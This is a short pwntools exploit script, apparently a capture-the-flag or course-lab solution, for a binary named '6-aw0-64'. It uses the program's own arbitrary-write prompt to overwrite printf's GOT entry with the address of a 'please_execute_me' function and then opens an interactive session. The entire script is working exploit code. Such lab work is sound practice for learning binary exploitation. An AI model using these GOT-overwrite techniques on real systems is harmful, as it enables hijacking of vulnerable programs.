from pwn import *

env = {'PATH': '.:/bin:/usr/bin'}

elf = ELF('./6-aw0-64')

#p = process(elf.path, env=env)
p = process(['/usr/local/pin/pin',  '-t', 'obj-intel64/script.so' , '--',  elf.path], env=env)

p.sendlineafter(b'How many bytes do you want to write (N, in decimal, max 128 bytes)?', b'8')
p.sendlineafter(b'What is the address that you want to write (A, in hexadexmial, e.g., 0xffffde01)?', hex(elf.got['printf']).encode())
p.sendlineafter(b'Please provide your input (MAX 8 bytes)', p64(elf.symbols['please_execute_me']))

p.interactive()
